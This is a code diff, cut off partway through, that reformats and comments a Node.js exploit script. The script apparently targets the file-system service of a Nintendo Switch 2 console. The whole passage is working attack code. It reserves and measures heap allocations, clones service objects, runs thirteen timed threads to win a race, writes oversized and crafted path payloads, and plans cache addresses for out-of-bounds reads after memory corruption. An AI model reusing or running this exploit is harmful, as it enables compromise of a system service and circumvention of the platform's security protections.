@@ -14,16 +14,25 @@ const functions = require("../../shared/sdk-functions.json");
 
 async function main() {
   // Fixed geometry and bounded attempts from the Switch 2 hardware run.
-  const probeReadSize = 0x180000, markerOffset = 0x2340;
-  const trialRange = 0x600000, cacheReadSize = 0x200000, fragmentCount = 16;
-  const minimumCacheHeld = 0x2810, metadataAttempts = 2, fieldCopies = 2;
+  const probeReadSize = 0x180000;
+  const markerOffset = 0x2340;
+  const trialRange = 0x600000;
+  const cacheReadSize = 0x200000;
+  const fragmentCount = 16;
+  const minimumCacheHeld = 0x2810;
+  const metadataAttempts = 2;
+  const fieldCopies = 2;
   const plannerCycle = 0x28000;
   const canonicalPlanner = require('./cache-address-plan.cjs');
   const addressPlanner = (target, size) => require('./signed-cache-plan.cjs').plan(target, size, plannerCycle);
   const label = 'reserved-gap-' + Date.now(), file = path.join(__dirname, label + '.json');
+
+  // s is a session to the main server
   const {s, live, directory} = await connect(label, 0x2400000);
   s.bulkUploads = true;
   s.uploadThreshold = (256);
+
+  // domain seems to be for cmif domains
   const domain = require(path.join(directory, 'domain.cjs'));
   const mounted = require(path.join(directory, 'mounted-save.cjs'));
   const events = require(path.join(directory, 'events.cjs'));
@@ -32,67 +41,114 @@ async function main() {
   const native = require(path.join(directory, 'native-worker.cjs'));
   const bulk = require(path.join(directory, 'bulk-transfer.cjs'));
   const {verifyWorkerCode, code} = require(path.join(directory, 'worker.cjs'));
+
+  // "normal" appears to be a wrapper for working with ipc calls that takes a path
   const {normal, raw} = paths(s, domain);
-  const b = s.base, master = b + 0x3000, holeDone = b + 0x3010, groupReleased = b + 0x3020;
-  const guardLaunched = b + 0x3030, spacingDecision = b + 0x2a20;
-  const completedFlag = b + 0x2a08, completedDecision = b + 0x2a0c;
-  const holeFinished = b + 0x2a10, earlyHole = b + 0x2a14, holeDecision = b + 0x2a18;
-  const zeroByte = b + 0x2a1c;
-  const gates = [], workers = [], created = [], storages = [];
-  const scratch = '/NS2_GAP_' + Date.now(), canary = normalizedPath(scratch + '/canary', 0x5a0);
-  const marker = 'SPAN_MARKER', absent = 'SPAN_ABSENT';
-  const segments = Array.from({length: 3}, (_, i) => 'S' + i + '_' + Date.now());
-  const extent = (0x2440);
-  const writeSize = 0x1000000, writeData = b + 0x1000000, output = b + 0xa00000;
-  const requests = Array.from({length: 13}, (_, i) => b + 0x10000 + i * 4096);
-  const preReleaseBuffer = b + 0x1d000, clearReportBuffer = b + 0x1e000, pinBuffer = b + 0x1f000;
+
+  // b is base addr
+  // master seems to be an event object? it's passed to os::WaitLightEvent
+  const b = s.base;
+  const masterAddr = b + 0x3000;
+  const holeDoneAddr = b + 0x3010;
+  const groupReleasedEvAddr = b + 0x3020;
+  const guardLaunchedEvAddr = b + 0x3030;
+  const spacingDecision = b + 0x2a20;
+  const completedFlagAddr = b + 0x2a08;
+  const completedDecisionAddr = b + 0x2a0c;
+  const holeFinishedAddr = b + 0x2a10;
+  const earlyHoleAddr = b + 0x2a14;
+  const holeDecisionAddr = b + 0x2a18;
+  const zeroByteAddr = b + 0x2a1c;
+  const eventList = [], workers = [], created = [], storages = [];
+  const scratchPath = '/NS2_GAP_' + Date.now(), canary = normalizedPath(scratchPath + '/canary', 0x5a0);
+  const markerStr = 'SPAN_MARKER', absentStr = 'SPAN_ABSENT';
+
+  // named "S<n>_<time>"
+  const segmentNames = Array.from({length: 3}, (_, i) => 'S' + i + '_' + Date.now());
+  const extentSize_maybe = (0x2440);
+  const writeSize = 0x1000000;
+  const writeData = b + 0x1000000;
+  const output = b + 0xa00000;
+  const threadIpcRequestAddrs = Array.from({length: 13}, (_, i) => b + 0x10000 + i * 4096);
+  const preReleaseBuffer = b + 0x1d000;
+  const clearReportBuffer = b + 0x1e000;
+  const pinBuffer = b + 0x1f000;
   const triggerInput = b + 0x30000;
   const tailInputs = Array.from({length: 4}, (_, i) => b + 0x32000 + i * 0x2000);
-  const report = {session: live.session, scratch, canary, extent, markerOffset,
+  const report = {session: live.session, scratch: scratchPath, canary, extent: extentSize_maybe, markerOffset,
     probeReadSize, trialRange, cacheReadSize, fragmentCount, minimumCacheHeld,
     metadataAttempts, fieldCopies, plannerCycle,
     started: new Date().toISOString(), cases: []};
-  let saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, released = false;
+  let saveFsHandle, tmpFsHandle, fspHandle, commitDataFileHandle, group, pinHandle, candidateHandle, romfsHandle, released = false;
   let cacheNeedsRestore = false, restoreCandidate;
   let addressPlan;
-  const save = reportWriter(file, () => ({...report, metrics: s.metrics, retained: {
+
+  // report bs
+  const repWriter = reportWriter(file, () => ({...report, metrics: s.metrics, retained: {
     base: s.base, bytes: s.bytes, handles: [...s.handles], threads: [...s.threads],
-    saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, cacheNeedsRestore,
-    created, storages, gates, workers, released,
+    saved: saveFsHandle, temporary: tmpFsHandle, root: fspHandle, fileHandle: commitDataFileHandle, group, pinHandle, candidateHandle, originalRom: romfsHandle, cacheNeedsRestore,
+    created, storages, gates: eventList, workers, released,
   }}));
-  const runControl = new RunControl({id: label, save});
+
+  // looks like boring reporting stuff
+  const runControl = new RunControl({id: label, save: repWriter});
   report.control = runControl.state;
+
+  // generate info for a func call
   const call = (offset, args = [0, 0, 0, 0], name) => ({function: live.sdk + offset, args, name});
+
+  // os::WaitLightEvent
   const wait = address => call(events.code.wait.offset, [address, 0, 0, 0]);
+
+  // os::SignalLightEvent
   const signal = address => call(events.code.signal.offset, [address, 0, 0, 0]);
+
+  // os::SleepThread w/ ns time
   const sleep = nanoseconds => call(code.sleep.offset, [nanoseconds, 0, 0, 0]);
+
+  // get system tick
   const tick = name => call(timing.code.tick.offset, undefined, name);
+
+  // svcSendSyncRequestWithUserBuffer w/ buffer at address and handle
   const send = (address, handle, name) => ({...call(functions.send.offset,
     [address, 4096, handle, 0], name), kind: 'ipc'});
+
   const copyWord = (destination, source, name) => call(0x586fb0, [destination, source, 4, 0], name);
   const setByte = (destination, value, name) => call(functions.memset.offset, [destination, value, 1, 0], name);
-  function context(bytes, value = 9) {
+
+
+  function setCmifTokenValue(bytes, value = 9) {
     const at = domain.wire.dataStart(bytes);
+    // set MessageType = Invoke2Method
     bytes.writeUInt32LE((bytes.readUInt32LE() & 0xffff0000) | 6);
+    // set CmifInHeader ver = 1
     bytes.writeUInt32LE(1, at + 4);
+    // set CmifInHeader Token = value
     bytes.writeUInt32LE(value, at + 12);
     return bytes;
   }
-  async function clone(handle) {
+
+  // probably handle cloning?
+  async function cloneCmifObject(handle) {
     return domain.oneHandle(await domain.send(s, 'Clone gap client', handle, domain.wire.control(2)));
   }
+
+  // write to process memory
   async function put(address, bytes) {
     const aligned = Buffer.alloc(Math.ceil(bytes.length / 4) * 4);
     bytes.copy(aligned);
     await s.write(address, aligned);
     return bytes.length;
   }
+
+  // fs GetAndClearMemoryReportInfo
   async function memory() {
     let reply;
-    for (let i = 0; i < 2; i++) reply = await s.ipc('Read gap allocation counters', root, 1009);
+    for (let i = 0; i < 2; i++) reply = await s.ipc('Read gap allocation counters', fspHandle, 1009);
     check(!reply.result, 'Allocation counters failed');
     return Array.from({length: 16}, (_, i) => Number(reply.data.readBigUInt64LE(i * 8)));
   }
+
   async function reserveGroupAttempt() {
     const owner = await domain.openDomain(s, 'Gap manager group');
     group = {owner, objects: [], rootCopy: null, outer: null};
@@ -122,22 +178,27 @@ async function main() {
     group.held = await memory();
     const allocated = group.before[5] - group.held[5];
     (report.reservationChecks ||= []).push({before: group.before[5], held: group.held[5], allocated});
-    await save();
+    await repWriter();
     if (allocated !== 59 * 208)
       throw Object.assign(Error('Unexpected manager allocation size: ' + allocated), {reservationAccounting: true});
     const converted = await domain.send(s, 'Wrap gap group', owner.handle, domain.wire.control(0));
     check(!converted.result, 'Group wrapping failed');
     group.outer = converted.data.readUInt32LE();
-    await s.write(requests[9], domain.wire.closeObject(group.outer));
+    await s.write(threadIpcRequestAddrs[9], domain.wire.closeObject(group.outer));
     const handle = Buffer.alloc(4);
     handle.writeUInt32LE(owner.handle);
     await s.write(b + 0x2a00, handle);
   }
+
+  // this just calls reserveGroupAttempt w/ error handling
   async function reserveGroup() {
     for (let attempt = 0; attempt < 3; attempt++) {
-      try {return await reserveGroupAttempt();}
+      try {
+        return await reserveGroupAttempt();
+      }
       catch (error) {
-        if (!error.reservationAccounting || attempt === 2) throw error;
+        if (!error.reservationAccounting || attempt === 2)
+          throw error;
         // Nothing in this group has been corrupted, and no worker has started
         // this wave. Release the owned group before measuring a fresh one.
         check(!s.threads.size, 'Cannot retry a reservation while workers are active');
@@ -145,7 +206,7 @@ async function main() {
         const observation = report.reservationChecks.at(-1);
         observation.releasedForRetry = true;
         observation.afterRelease = await memory();
-        await save();
+        await repWriter();
       }
     }
   }
@@ -174,64 +235,113 @@ async function main() {
     await fs.copyFile(__filename, path.join(__dirname, label + '-source.cjs'));
     for (const helper of ['cache-address-plan.cjs', 'fs-memory-control.cjs', 'session-tools.cjs', 'run-control.cjs', 'capture-workers.cjs', 'native-links.cjs'])
       await fs.copyFile(path.join(__dirname, helper), path.join(__dirname, label + '-' + helper));
+
     for (const helper of ['native-worker.cjs', 'affinity.cjs'])
       await fs.copyFile(path.join(directory, helper), path.join(__dirname, label + '-' + helper));
+
     await fs.copyFile(path.join(__dirname, 'cache-address-plan.cjs'), path.join(__dirname, label + '-address-plan-source.cjs'));
     {
       await fs.copyFile(path.join(__dirname, 'signed-cache-plan.cjs'), path.join(__dirname, label + '-signed-plan-source.cjs'));
     }
+
+    // this verify stuff doesn't matter
     await verifyWorkerCode(s);
-    await s.verifyCode({offset: 0x586fb0, bytes:
-      'e80301cb090940923f0102eb22040054a90700b4ea0301aaeb0300aaa8091037280a0837680000364801403968010039420009cb0800098b2100098b1f0940f2'},
-    'Original SDK memcpy used by the native guard');
+    await s.verifyCode(
+      {
+        offset: 0x586fb0, bytes:
+        'e80301cb090940923f0102eb22040054a90700b4ea0301aaeb0300aaa8091037280a0837680000364801403968010039420009cb0800098b2100098b1f0940f2'
+      },
+      'Original SDK memcpy used by the native guard'
+    );
     await events.verify(s);
     const frequency = await timing.verify(s), mask = await affinity.available(s);
     const cores = Array.from({length: 32}, (_, i) => 1n << BigInt(i)).filter(bit => bit & mask);
-    saved = await mounted.cloneMountedFilesystem(s, 'save');
-    temporary = await mounted.cloneMountedFilesystem(s, 'tmp');
-    root = await s.openService('fsp-srv');
-    check(!(await s.ipc('Initialize gap root', root, 1, u64(0), {pid: true})).result, 'Root initialization failed');
+
+    // clone save and tmp mounts
+    saveFsHandle = await mounted.cloneMountedFilesystem(s, 'save');
+    tmpFsHandle = await mounted.cloneMountedFilesystem(s, 'tmp');
+
+    // get fsp session, root = fsp
+    fspHandle = await s.openService('fsp-srv');
+    check(!(await s.ipc('Initialize gap root', fspHandle, 1, u64(0), {pid: true})).result, 'Root initialization failed');
     {
+      // this is useless :)
       await fs.copyFile(path.join(__dirname, 'mounted-rom.cjs'), path.join(__dirname, label + '-mounted-rom-source.cjs'));
+
+      // clone the current romfs storage object
       const copied = await require("./mounted-rom.cjs").cloneMountedRom(s, live, directory);
-      originalRom = copied.handle;
+      romfsHandle = copied.handle;
       report.originalRom = copied.source;
     }
-    for (const [name, handle, bytes] of [['save', saved, writeSize + 0x400000], ['tmp', temporary, 0x10000]]) {
+
+    // query free size of save and tmp, and create a "NS2_GAP_{date}" file in each
+    for (const [name, handle, bytes] of [['save', saveFsHandle, writeSize + 0x400000], ['tmp', tmpFsHandle, 0x10000]]) {
+      // GetFreeSpaceSize
       const space = await normal(handle, 11, '/');
       check(!space.result && space.data.readBigUInt64LE() > BigInt(bytes), 'Insufficient ' + name + ' space');
-      check((await normal(handle, 7, scratch)).canonicalResult === 0x202, 'Scratch already exists');
-      check(!(await normal(handle, 2, scratch)).result, 'Scratch creation failed');
-      created.push({name, handle, path: scratch});
-      await save();
+
+      // GetEntryType
+      check((await normal(handle, 7, scratchPath)).canonicalResult === 0x202, 'Scratch already exists');
+
+      // CreateDirectory
+      check(!(await normal(handle, 2, scratchPath)).result, 'Scratch creation failed');
+      created.push({name, handle, path: scratchPath});
+      await repWriter();
     }
-    const filename = scratch + '/commit_data';
-    check(!(await normal(saved, 0, filename, Buffer.concat([u64(0), u64(writeSize)]))).result, 'Commit file creation failed');
+
+    // Create "NS2_GAP_{}/commit_data" file in savefs
+    const filename = scratchPath + '/commit_data';
+    check(!(await normal(saveFsHandle, 0, filename, Buffer.concat([u64(0), u64(writeSize)]))).result, 'Commit file creation failed');
+
+    // canary is NS2_GAP_{}/canary
+    // this is creating the canary parent dirs
+    // they are already created so this is pointless(?)
     const parts = canary.slice(1).split('/');
-    for (let i = 2; i < parts.length; i++) check(!(await normal(saved, 2,
-      '/' + parts.slice(0, i).join('/'))).result, 'Canary parent creation failed');
-    check(!(await normal(saved, 0, canary, Buffer.concat([u64(0), u64(1)]))).result, 'Canary creation failed');
-    const control = await normal(saved, 7, canary);
-    check(!control.result && control.data.readUInt32LE() === 1, 'Canary is not a file');
-    report.abortControlResult = (await normal(saved, 7, '')).canonicalResult;
-    const selectedDirectory = scratch + '/selected';
-    check(!(await normal(saved, 2, selectedDirectory)).result, 'Replacement directory creation failed');
-    let markerDirectory = scratch;
-    for (const segment of segments) {
+    for (let i = 2; i < parts.length; i++)
+      check(!(await normal(saveFsHandle, 2, '/' + parts.slice(0, i).join('/'))).result, 'Canary parent creation failed');
+
+    // create canary file
+    check(!(await normal(saveFsHandle, 0, canary, Buffer.concat([u64(0), u64(1)]))).result, 'Canary creation failed');
+
+    // GetEntryType on just-created file (I don't think this does anything?)
+    const control = await normal(saveFsHandle, 7, canary);
+    check(!control.result && control.data.readUInt32LE() === 1, 'Canary is not a file'); // pointless bs
+
+    // check entry type of save root dir?
+    report.abortControlResult = (await normal(saveFsHandle, 7, '')).canonicalResult;
+
+    // create "selected" dir in save
+    const selectedDirectory = scratchPath + '/selected';
+    check(!(await normal(saveFsHandle, 2, selectedDirectory)).result, 'Replacement directory creation failed');
+
+    // Create "<scratch>/S0_<time>", "<scratch>/S0_<time>/S1_<time>", "<scratch>/S0_<time>/S1_<time>/S2_<time>" dirs in temp save
+    let markerDirectory = scratchPath;
+    for (const segment of segmentNames) {
       markerDirectory += '/' + segment;
-      check(!(await normal(temporary, 2, markerDirectory)).result, 'Extent directory creation failed');
+      check(!(await normal(tmpFsHandle, 2, markerDirectory)).result, 'Extent directory creation failed');
     }
-    check(!(await normal(temporary, 0, markerDirectory + '/' + marker,
+
+    // Create 'SPAN_MARKER' in dir created above
+    check(!(await normal(tmpFsHandle, 0, markerDirectory + '/' + markerStr,
       Buffer.concat([u64(0), u64(1)]))).result, 'Extent marker creation failed');
-    const storage = domain.oneHandle(await s.ipc('Open own gap content', root, 200));
-    const storageSize = await domain.storageSize(s, storage);
+
+    // OpenDataStoreByCurrentProcess
+    const romStorage = domain.oneHandle(await s.ipc('Open own gap content', fspHandle, 200));
+
+    // Get romfs size
+    const storageSize = await domain.storageSize(s, romStorage);
     check(storageSize >= BigInt(probeReadSize), 'Own content is too small');
     report.storageSize = storageSize.toString();
-    if (originalRom) check(await domain.storageSize(s, originalRom) === storageSize, 'Mounted RomFS size differs');
+
+    // Check if its size matches the mounted object
+    if (romfsHandle)
+      check(await domain.storageSize(s, romfsHandle) === storageSize, 'Mounted RomFS size differs');
+
+
     async function nativeLinks(range) {
       const snapshots = [range, ...(range.fragmentation || [])];
-      if (range.beforeReleaseFile) snapshots.unshift({name: 'before-release',
-        outputFile: range.beforeReleaseFile, outputSha256: range.beforeReleaseSha256});
+      if (range.beforeReleaseFile)
+        snapshots.unshift({name: 'before-release', outputFile: range.beforeReleaseFile, outputSha256: range.beforeReleaseSha256});
       const candidates = await require("./native-links.cjs").findNativeLinks(snapshots, true);
       for (const item of candidates) {
         item.encodable = false;
@@ -242,167 +352,339 @@ async function main() {
       }
       return candidates;
     }
+
+    // if I had to guess with no further context, this is used to read info out of
+    // FS's memory after memory corruption bs is done, but idk
     async function prepareAddressControl(evidence, evidenceFile) {
       addressPlan = (require("../retained/lower-window.cjs").lowerWindow(
-        Number(evidence.target), Number(storageSize), plannerCycle, report.linkCandidates.map(item => item.target)));
-      report.cacheAddress = {evidenceFile: path.resolve(evidenceFile), evidence,
+        Number(evidence.target), Number(storageSize), plannerCycle, report.linkCandidates.map(item => item.target))
+      );
+
+      report.cacheAddress = {
+        evidenceFile: path.resolve(evidenceFile), evidence,
         lowerWindow: addressPlan.lowerWindow,
         encoding: addressPlan.encoding, addressBias: addressPlan.addressBias, arithmetic: addressPlan.arithmetic,
         plannerCycle: addressPlan.cycle, headerFormat: addressPlan.headerFormat || 'original',
         target: addressPlan.target, base: addressPlan.base, entryOffset: addressPlan.entryOffset,
-        readOffset: addressPlan.readOffset, header: addressPlan.bytes.toString('hex')};
+        readOffset: addressPlan.readOffset, header: addressPlan.bytes.toString('hex')
+      };
+
+      // useless comment from original:
       // Read the ordinary content before installing a raw pointer. Combined
       // acquisition requalifies the cache alias after these reads.
+
+
+      // 0xa5-init "output" buffer
       await s.call('memset', output, 0xa5, 0x4000);
-      const ordinary = await s.ipc('Read the ordinary address-window control', storage, 0,
+
+      // this reads 0x4000 of whatever is at readOffset in rom into output
+      const ordinary = await s.ipc(
+        'Read the ordinary address-window control', romStorage, 0,
         Buffer.concat([u64(addressPlan.readOffset), u64(0x4000)]),
-        {receive: [{address: output, size: 0x4000, mode: 1}]});
+        {receive: [{address: output, size: 0x4000, mode: 1}]}
+      );
+
       check(!ordinary.result, 'Ordinary address-window control failed');
       report.cacheAddress.controlFile = path.join(__dirname, label + '-address-control.bin');
+
       await fs.writeFile(report.cacheAddress.controlFile, await s.readOwned(output, 0x4000), {mode: 0o600});
       {
+        // just 0xa5-initing "output" buffer
         await s.call('memset', output, 0xa5, 16);
-        const period = await s.ipc('Read the ordinary bucket-period control', storage, 0,
-          Buffer.concat([u64(0x28000), u64(16)]), {receive: [{address: output, size: 16, mode: 1}]});
+
+        // read 0x10 bytes from offset 0x28000 in rom storage into output
+        const period = await s.ipc(
+          'Read the ordinary bucket-period control', romStorage, 0,
+          Buffer.concat([u64(0x28000), u64(16)]),
+          {receive: [{address: output, size: 16, mode: 1}]}
+        );
+
         check(!period.result, 'Ordinary bucket-period control failed');
         report.cacheAddress.periodControlHex = (await s.readOwned(output, 16)).toString('hex');
       }
     }
-    const clients = [await clone(saved), storage];
-    for (let i = 0; i < 4; i++) clients.push(await clone(root));
-    for (let i = 0; i < 3; i++) clients.push(await clone(saved));
-    clients.push({u32: b + 0x2a00}, await clone(saved), await clone(saved), {u32: b + 0x2a04});
-    const savedTrigger = await clone(saved), tmpTrigger = await clone(temporary);
-    for (const gate of [master, holeDone, groupReleased, guardLaunched]) {
-      await events.initialize(s, gate);
-      gates.push(gate);
+
+    // create clone of save fs object, save it with rom IStorage
+    const clients = [await cloneCmifObject(saveFsHandle), romStorage];
+
+    // Create 4 clones of the IFileSystemProxy object
+    for (let i = 0; i < 4; i++)
+      clients.push(await cloneCmifObject(fspHandle));
+
+    // And 3 of the save IFileSystem
+    for (let i = 0; i < 3; i++)
+      clients.push(await cloneCmifObject(saveFsHandle));
+
+    // more save handle cloning and ???
+    clients.push({u32: b + 0x2a00}, await cloneCmifObject(saveFsHandle), await cloneCmifObject(saveFsHandle), {u32: b + 0x2a04});
+
+    // clone save & tmp objects
+    const savedTrigger = await cloneCmifObject(saveFsHandle), tmpTrigger = await cloneCmifObject(tmpFsHandle);
+    for (const curEvent of [masterAddr, holeDoneAddr, groupReleasedEvAddr, guardLaunchedEvAddr]) {
+      await events.initialize(s, curEvent);
+      eventList.push(curEvent);
     }
+
+    // clear 0x1000000 at base+0x1000000 to 0x66
     await s.call('memset', writeData, 0x66, writeSize);
+
     const canarySize = await put(b + 0x40000, Buffer.from(canary + '\0'));
-    const guard = normalizedPath(scratch + '/absent', 0x300);
-    for (let i = 0; i < 2; i++) await put(b + 0x42000 + i * 4096,
-      Buffer.from((i ? guard.slice(0, -1) + 'C' : guard) + '\0'));
-    const guardRequest = pathPackets(5, Buffer.alloc(0), [0, 1].map(i =>
-      ({address: b + 0x42000 + i * 4096, size: 0x301})));
+
+    // Setup paths for guardRequest, '<scratch>/absent' and '<scratch>/absenC'
+    const guard = normalizedPath(scratchPath + '/absent', 0x300);
+    for (let i = 0; i < 2; i++) 
+      await put(b + 0x42000 + i * 0x1000, Buffer.from((i ? guard.slice(0, -1) + 'C' : guard) + '\0'));
+
+    // RenameFile, <scratch>/absent to <scratch>/absenC
+    const guardRequest = pathPackets(5, Buffer.alloc(0), 
+      [
+        {address: b + 0x42000, size: 0x301},
+        {address: b + 0x43000, size: 0x301}
+      ]
+    );
+
+    // RenameFile, /NS2_SRC00000000 to /NS2_whatever/page_absent
     await put(b + 0x45000, Buffer.from('/NS2_SRC00000000'));
-    await put(b + 0x46000, Buffer.from(normalizedPath(scratch + '/page_absent', 0x7ef) + '\0'));
+    await put(b + 0x46000, Buffer.from(normalizedPath(scratchPath + '/page_absent', 0x7ef) + '\0'));
     const fillerRequest = pathPackets(5, Buffer.alloc(0),
-      [{address: b + 0x45000, size: 16}, {address: b + 0x46000, size: 0x7f0}]);
-    for (const bytes of [guardRequest, fillerRequest]) check((await domain.send(s,
-      'Ordinary gap path control', saved, bytes)).canonicalResult === 0x202, 'Path control differs');
-    for (let i = 0; i < 1; i++) storages.push(domain.oneHandle(
-      await s.ipc('Reserve own gap content ' + i, root, 200)));
-    const roles = ['commit', 'hole', 'tail0', 'tail1', 'tail2', 'tail3', 'canary',
+      [
+        {address: b + 0x45000, size: 16},
+        {address: b + 0x46000, size: 0x7f0}
+      ]
+    );
+
+    // send both commands, both must return result PathNotFound
+    for (const bytes of [guardRequest, fillerRequest]) 
+      check((await domain.send(s, 'Ordinary gap path control', saveFsHandle, bytes)).canonicalResult === 0x202, 'Path control differs');
+
+    // create another rom IStorage handle
+    storages.push(domain.oneHandle(await s.ipc('Reserve own gap content', fspHandle, 200)));
+
+    const threadNames = ['commit', 'hole', 'tail0', 'tail1', 'tail2', 'tail3', 'canary',
       'filler0', 'filler1', 'release', 'guard0', 'guard1', 'trigger'];
-    const delays = ([0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000]);
-    report.workerDelaysNs = delays;
-    const plans = roles.map((role, i) => {
-      const steps = [wait(master)];
-      if (i < 10) steps.push(sleep(delays[i]));
-      else if (i < 12) steps.push(wait(groupReleased), sleep((i - 10) * 150000));
-      else steps.push(sleep(2400000), wait(groupReleased), wait(guardLaunched), sleep(400000),
-        copyWord(spacingDecision, holeFinished, 'sampleMinimumSpacing'), wait(holeDone));
-      if (i === 9) steps.push(tick('pinStart'), send(pinBuffer, root, 'pin'), tick('pinEnd'));
-      if (i === 9) steps.push(tick('clearStart'), send(clearReportBuffer, root, 'clearReport'), tick('clearEnd'),
-        tick('memoryStart'), send(preReleaseBuffer, root, 'preRelease'), tick('memoryEnd'));
-      if (i === 11) steps.push(copyWord(earlyHole, holeFinished, 'sampleReceiveOrder'), signal(guardLaunched));
-      if (i === 12) steps.push(copyWord(completedDecision, completedFlag, 'sampleCompleted'),
-        copyWord(holeDecision, earlyHole, 'sampleEarlyHole'),
-        // A zero-length copy preserves the payload. A one-byte copy makes
-        // it an ordinary empty path before the kernel receives the buffer.
-        call(0x586fb0, [triggerInput, zeroByte, {u32: completedDecision}, 0], 'abortCompleted'),
-        call(0x586fb0, [triggerInput, zeroByte, {u32: holeDecision}, 0], 'abortEarlyHole'),
-        call(0x586fb0, [triggerInput, zeroByte, {u32: spacingDecision}, 0], 'abortMinimumSpacing'));
-      steps.push(tick('start'), send(requests[i], clients[i], role), tick('end'));
-      if (i === 1) steps.push(setByte(holeFinished, 1, 'holeFinished'), signal(holeDone));
-      if (i === 9) steps.push(signal(groupReleased));
+
+    // these "plans" are a sequence of calls / stack frames
+    const threadDelays = ([0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000]);
+    report.workerDelaysNs = threadDelays;
+    const threadFuncCalls = threadNames.map((role, i) => {
+      // wait on event 'master'
+      const steps = [wait(masterAddr)];
+
+      // wait N ns on 'commit' to 'release'
+      // wait on group_released and sleep for a bit on guard0/guard1
+      // on trigger:
+      //   wait 2400us
+      //   wait for groupReleased and guardLaunched
+      //   sleep 400us
+      //
+      //   wait for holeDone ev
+      if (i < 10)
+        steps.push(sleep(threadDelays[i]));
+      else if (i < 12)
+        steps.push(wait(groupReleasedEvAddr), sleep((i - 10) * 150000));
+      else
+        steps.push(sleep(2400000), wait(groupReleasedEvAddr), wait(guardLaunchedEvAddr), sleep(400000),
+          copyWord(spacingDecision, holeFinishedAddr, 'sampleMinimumSpacing'), wait(holeDoneAddr));
+
+      // either cmd 200 (OpenDataStorageByCurrentProcess) or 1009 (GetAndClearMemoryReportInfo), save start and end times
+      if (i === 9)
+        steps.push(tick('pinStart'), send(pinBuffer, fspHandle, 'pin'), tick('pinEnd'));
+
+      // setup later, cmd 1009 (GetAndClearMemoryReportInfo)
+      // ^ both clearReportBuffer and preReleaseBuffer
+      if (i === 9)
+        steps.push(tick('clearStart'), send(clearReportBuffer, fspHandle, 'clearReport'), tick('clearEnd'),
+          tick('memoryStart'), send(preReleaseBuffer, fspHandle, 'preRelease'), tick('memoryEnd'));
+
+      if (i === 11)
+        steps.push(copyWord(earlyHoleAddr, holeFinishedAddr, 'sampleReceiveOrder'), signal(guardLaunchedEvAddr));
+
+      if (i === 12)
+        steps.push(copyWord(completedDecisionAddr, completedFlagAddr, 'sampleCompleted'),
+          copyWord(holeDecisionAddr, earlyHoleAddr, 'sampleEarlyHole'),
+          // A zero-length copy preserves the payload. A one-byte copy makes
+          // it an ordinary empty path before the kernel receives the buffer.
+          call(0x586fb0, [triggerInput, zeroByteAddr, {u32: completedDecisionAddr}, 0], 'abortCompleted'),
+          call(0x586fb0, [triggerInput, zeroByteAddr, {u32: holeDecisionAddr}, 0], 'abortEarlyHole'),
+          call(0x586fb0, [triggerInput, zeroByteAddr, {u32: spacingDecision}, 0], 'abortMinimumSpacing'));
+
+      // setup thread-specific hipc request
+      steps.push(tick('start'), send(threadIpcRequestAddrs[i], clients[i], role), tick('end'));
+
+
+      if (i === 1)
+        steps.push(setByte(holeFinishedAddr, 1, 'holeFinished'), signal(holeDoneAddr));
+
+      // signal groupReleased, allowing guard0/1 to continue
+      if (i === 9)
+        steps.push(signal(groupReleasedEvAddr));
+
+
       if (i === 0 || i >= 2 && i <= 8 || i === 10 || i === 11)
-        steps.push(setByte(completedFlag, 1, 'protectedRequestFinished'));
+        steps.push(setByte(completedFlagAddr, 1, 'protectedRequestFinished'));
       return steps;
     });
 
     async function wave(profile, readSize, customPayload = null) {
       await runControl.begin(profile);
+
       const hostStarted = performance.now(), hostRequests = s.metrics.requests;
       const createPin = (!pinHandle);
       released = false;
-      for (const gate of gates) await events.clear(s, gate);
-      await s.write(completedFlag, Buffer.alloc(32));
-      if (profile === 'abort-control') await s.write(completedFlag, Buffer.from([1, 0, 0, 0]));
-      if (profile === 'abort-hole-control') await s.write(holeFinished, Buffer.from([1, 0, 0, 0]));
-      fileHandle = domain.oneHandle(await normal(saved, 8, filename, Buffer.from([3, 0, 0, 0])));
-      check(!(await s.ipc('Dirty gap commit data', fileHandle, 1,
-        Buffer.concat([u64(0), u64(0), u64(writeSize)]),
-        {send: [{address: writeData, size: writeSize, mode: 1}]})).result, 'Scratch write failed');
-      await s.close(fileHandle);
-      fileHandle = null;
-      const payload = customPayload ? Buffer.from(customPayload) : Buffer.alloc(extent + 1, '/');
+      for (const curEvent of eventList)
+        await events.clear(s, curEvent);
+      await s.write(completedFlagAddr, Buffer.alloc(32));
+      if (profile === 'abort-control')
+        await s.write(completedFlagAddr, Buffer.from([1, 0, 0, 0]));
+      if (profile === 'abort-hole-control')
+        await s.write(holeFinishedAddr, Buffer.from([1, 0, 0, 0]));
+
+      // OpenFile commit_data file from save
+      commitDataFileHandle = domain.oneHandle(await normal(saveFsHandle, 8, filename, Buffer.from([3, 0, 0, 0])));
+
+      // WriteFile b+0x1000000 data (all 0x66, from init)
+      check(!(
+        await s.ipc('Dirty gap commit data', commitDataFileHandle, 1,
+          Buffer.concat([u64(0), u64(0), u64(writeSize)]),
+          {send: [{address: writeData, size: writeSize, mode: 1}]})).result,
+        'Scratch write failed'
+      );
+
+      // close the opened file
+      await s.close(commitDataFileHandle);
+      commitDataFileHandle = null;
+
+      // payload looks like it ends up being a path
+      // extent is 0x2440
+      // default payload is just a bunch of '/'
+      // probably passed to smth later
+      const payload = customPayload ? Buffer.from(customPayload) : Buffer.alloc(extentSize_maybe + 1, '/');
+
+
       payload[payload.length - 1] = 0;
+
+      // check info about cur profile
       const isExtent = profile.startsWith('extent-');
       const isPositive = ['positive', 'binary-control', 'address-encoding-control'].includes(profile) || profile.startsWith('locate-');
+
+
       if (customPayload) {
+        // must start with '/..\'
         check(payload.subarray(0, 4).equals(Buffer.from('/..\\')), 'Custom copy prefix differs');
         check(!payload.subarray(0, -1).includes(0), 'Custom copy has an embedded terminator');
       } else if (isExtent) {
-        payload.write(scratch + '/');
-        for (let i = 0; i < segments.length; i++) payload.write('/' + segments[i] + '/', (i + 1) * 0x800);
-        const basename = profile === 'extent-present' ? marker : absent;
-        payload.write(basename, extent - basename.length);
+        // write '<scratch>/'
+        payload.write(scratchPath + '/');
+
+        // segments are those S<n>_<time> strings
+        // this produces '/S<n>_<time>/' for n=0...2
+        for (let i = 0; i < segmentNames.length; i++)
+          payload.write('/' + segmentNames[i] + '/', (i + 1) * 0x800);
+        const basename = profile === 'extent-present' ? markerStr : absentStr;
